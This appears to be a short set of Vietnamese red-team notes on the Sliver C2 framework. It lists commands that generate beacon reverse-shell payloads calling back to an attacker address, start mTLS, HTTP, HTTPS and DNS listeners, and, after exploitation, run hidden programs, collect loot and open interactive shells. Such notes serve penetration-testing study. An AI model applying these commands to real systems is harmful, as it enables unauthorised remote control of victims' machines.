# Sliver

## Setup

### Tạo payload

Sliver chia payload reverse shell thành hai loại chính đó là `Beacon` và `Session` payload

#### Beacon Shellcode

```
sliver > generate beacon --mtls <ip address>:<port> -f shellcode
```

#### Beacon Binary

```
sliver > generate beacon --mtls <ip address>:<port> --os #{os} -f #{file_format}
```

- `os`: windows | linux
- `file_format`: exe | elf

### Stager

**Tại sao phải dùng stager ?**
> Đọc trong [Stager Note](./stager.md) nhé :>

## Exploit

### Tạo Listener

#### MTLS

```bash
sliver > mtls
```

#### HTTP

```bash
sliver > http
```

#### HTTPS

```bash
sliver > https
```

#### DNS

```bash
sliver > dns
```

### Post Exploit

#### Tương tác beacon

```bash
sliver > beacons
sliver > use <beacon_id>
```

- Thực thi lệnh với execute cho phép chạy một chương trình trên hệ thống bị khai thác.

```bash
sliver (LIVE_MOUSSE) > help execute

Usage:
  execute [flags]

Flags:
  -h, --help            Hiển thị trợ giúp cho lệnh execute
  -H, --hidden          Ẩn cửa sổ của process (Windows only)
  -S, --ignore-stderr   Không in STDERR ra console
  -X, --loot            Lưu output thành loot
  -n, --name string     Tên loot (tùy chọn)
  -o, --output          Ghi lại output của lệnh
  -P, --ppid uint32     Parent Process ID (Windows only)
  -s, --save            Lưu output vào file
  -E, --stderr string   Đường dẫn để redirect STDERR trên máy remote
  -O, --stdout string   Đường dẫn để redirect STDOUT trên máy remote
  -t, --timeout int     Timeout gRPC (mặc định 60 giây)
  -T, --token           Thực thi lệnh với token hiện tại (Windows only)
```

- Ví dụ:
```bash
# Chạy lệnh "ipconfig" và hiển thị output
execute -o ipconfig

# Chạy ẩn một chương trình trên Windows
execute -H calc.exe

# Lưu kết quả của "whoami" thành loot
execute -o whoami -X -n whoami_loot
```

#### Tạo session từ beacon

```bash
sliver (<beacon_name>) > interactive
sliver (<beacon_name>) > sessions
sliver (<beacon_name>) > use <session_id>
```

#### Tạo shell từ session

```bash
sliver (<session_name>) > shell
```
